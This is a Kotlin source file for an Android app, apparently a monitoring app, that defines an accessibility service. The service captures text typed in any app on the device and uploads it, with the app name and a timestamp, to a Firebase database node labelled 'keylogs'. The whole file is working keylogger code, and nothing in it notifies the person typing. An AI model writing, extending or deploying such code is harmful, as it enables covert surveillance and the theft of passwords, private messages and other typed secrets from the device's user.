package com.surokkhanet

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase

class AccessibilityService : AccessibilityService() {

    private val database by lazy { Firebase.database }

    override fun onServiceConnected() {
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
            notificationTimeout = 100
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // short: do minimal work
        event?.let {
            try {
                if (it.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                    val text = it.text?.joinToString("") ?: ""
                    if (text.isNotEmpty()) {
                        database.getReference("keylogs").push().setValue(mapOf(
                            "text" to text,
                            "package" to it.packageName,
                            "timestamp" to System.currentTimeMillis()
                        ))
                    }
                }
            } catch (e: Exception) {
                Log.e("A11y", e.message ?: "e")
            }
        }
    }

    override fun onInterrupt() {}
}
